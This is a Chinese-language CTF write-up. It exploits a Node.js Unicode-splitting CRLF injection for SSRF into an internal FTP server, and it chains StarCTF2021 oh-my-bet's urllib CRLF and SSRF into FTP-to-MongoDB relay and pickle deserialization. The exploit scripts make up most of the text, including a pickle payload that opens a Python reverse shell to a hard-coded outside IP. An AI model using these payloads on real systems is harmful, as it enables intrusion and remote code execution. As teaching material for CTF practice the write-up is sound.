经过尝试该题目中存在Nodejs曾爆出的一个SSRF漏洞，即Unicode拆分攻击，可以进行CRLF注入
利用原理如下
在Node.js尝试发出一个路径中含有控制字符的HTTP请求，它们会被URL编码。
而当Node.js版本8或更低版本对此URL发出GET请求时，`\u{ff0a}\u{ff0d}`不会进行转义，因为它们不是HTTP控制字符：
但是当结果字符串被默认编码为latin1写入路径时，这些字符将分别被截断为`\x0a\x0d`也即`\r\n` 从而实现了`CRLF`注入
    headers = {
        "Accept":"*/*",
        "Authorization":"Bearer "+token,
    }
    url_payload = "http://buptmerak.cn:2333/"
    payload ='''
    USER anonymous
    PASS admin888
    CWD files
    TYPE I
    PORT vpsip,0,1890
    RETR flag
    '''.replace("\n","\r\n")
    def payload_encode(raw):
        ret = u""
        for i in raw:
            ret += chr(0xff00+ord(i))
        return ret
    #url_payload = url_payload + payload.replace("\n","\uff0d\uff0a")
    #url_payload = url_payload + payload.replace(" ","\uff20").replace("\n","\uff0d\uff0a")
    url_payload = url_payload + payload_encode(payload)
    print(url_payload)
    json = {
        "url":url_payload
    }
    req = r.post(url+"home",headers=headers,json=json)
    print(req.text)
可以看到发回的包
已经实现了CRLF的注入，这里的payload也就是我们最终构造的FTP请求包，通过这个请求包，可以使FTP主动向我们的服务器发送上面的文件
USER anonymous 以匿名模式登录  
PASS 随意  
CWD 切换文件夹  
TYPE I 以binary格式传输  
PORT vpsip,0,1890 打开FTP主动模式  
RETR 向对应ip:port 发送文件
在vps上开一个监听端口，就能监听到发来的文件了
    headers = {
        "Accept":"*/*",
        "Authorization":"Bearer "+token,
    }
    url_payload = "http://ftp:8899/" #题目附件中docker-compose.yml中泄露的内网主机名
    payload ='''
    USER anonymous
    PASS admin888
    CWD files
    TYPE I
    PORT vpsip,0,1890
    RETR flag
    '''.replace("\n","\r\n")
    def payload_encode(raw):
        ret = u""
        for i in raw:
            ret += chr(0xff00+ord(i))
        return ret
    #url_payload = url_payload + payload.replace("\n","\uff0d\uff0a")
    #url_payload = url_payload + payload.replace(" ","\uff20").replace("\n","\uff0d\uff0a")
    url_payload = url_payload + payload_encode(payload)
    print(url_payload)
    json = {
        "url":url_payload
    }
    req = r.post(url+"home",headers=headers,json=json)
    print(req.text)
####  StarCTF2021 oh-my-bet
题目在获取头像地址处存在ssrf
    def get_avatar(username):
        dirpath = os.path.dirname(__file__)
        user = User.query.filter_by(username=username).first()
        avatar = user.avatar
        if re.match('.+:.+', avatar):
            path = avatar
        else:
            path = '/'.join(['file:/', dirpath, 'static', 'img', 'avatar', avatar])
        try:
            content = base64.b64encode(urllib.request.urlopen(path).read())
        except Exception as e:
            error_path = '/'.join(['file:/', dirpath, 'static', 'img', 'avatar', 'error.png'])
            content = base64.b64encode(urllib.request.urlopen(error_path).read())
            print(e)
        return content
    import urllib.parse
    import requests
    import re
    import base64
    import time
    url = "http://localhost:8088/login"
    def read_file(filename):
        name = "eki"+str(time.time())
        avatar = filename
        data = {
            "username":name,
            "password":"322",
            "avatar":avatar,
            "submit":"Go!",
        }
        res = requests.post(url,data=data)
        txt = res.text
        find = re.findall("",txt)
        if len(find) != 0:
            with open("out",'wb') as f:
                st = base64.b64decode(find[0][32:-47])
                f.write(st)
                if len(st) == 4611:
                    print("{} not exists!".format(filename))
                else:
                    print("Success！->out")
        else:
            print("Error")
            print(res.text)
    read_file("file:///app/app.py")
并且该版本的`urllib.request.urlopen(path)`存在`CRLF`注入漏洞
分析题目给出的源码，我们能得到最终的解题思路是
向FTP传输恶意流量包并存储->FTP向Mongodb发送恶意流量包插入恶意Session->Session Pickle 反序列化反弹shell
#####  生成恶意mongdb流量包
生成恶意pickle序列化串
    import pickle
    import base64
    import os
    class RCE:
        def __reduce__(self):
            cmd = ("""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("81.70.154.76",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'""")
            return os.system, (cmd,)
    if __name__ == '__main__':
        pickled = pickle.dumps(RCE())
        print(base64.urlsafe_b64encode(pickled))
        open("exploit.b64", "w").write(base64.urlsafe_b64encode(pickled).decode())
生成Mongodb的BSON数据
    const BSON = require('bson');
    const fs = require('fs');
    // Serialize a document
    const doc = {insert: "sessions", $db: "admin", documents: [{
        "id": "session:e51fca6f-1248-450c-8961-b5d1a1aaaaaa",
        "val": Buffer.from(fs.readFileSync("exploit.b64").toString(), "base64"),
        "expiration": new Date("2025-02-17")
    }]};
    const data = BSON.serialize(doc);
    let beginning = Buffer.from("5D0000000000000000000000DD0700000000000000", "hex");
    let full = Buffer.concat([beginning, data]);
    full.writeUInt32LE(full.length, 0);
    fs.writeFileSync("bson.bin", full);
#####  攻击流程
上传到内网FTP服务器
    payload = '''
    TYPE I
    PORT vpsip,78,32
    STOR bson.bin
    '''
    exp = 'http://172.20.0.2:8877/'
    exp += urllib.parse.quote(payload.replace('\n', '\r\n'))
    read_file(exp)
vps打开文件发送
    import socket
    HOST = '0.0.0.0'  
    PORT = 20000        
    blocksize = 4096
    fp = open('bson.bin', 'rb')
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        print('start listen...')
        s.listen()
        conn, addr = s.accept()
        with conn:
            while 1:
                buf = fp.read(blocksize)
                if not buf:
                    fp.close()
                    break
                conn.sendall(buf)
        print('end.')
内网FTP向Mongodb发送构造恶意数据包
    payload = '''
    TYPE I
    PORT 172,20,0,5,105,137
    RETR bson.bin
    '''
    exp = 'http://172.20.0.2:8877/'
    exp += urllib.parse.quote(payload.replace('\n', '\r\n'))
    read_file(exp)
最终触发
    import requests
    url = "http://localhost:8088/"
    cookie = {
        "session":"e51fca6f-1148-450c-8961-b5d1aaaaaaaa"
    }
    req = requests.get(url,cookie=cookie)
## 参考资料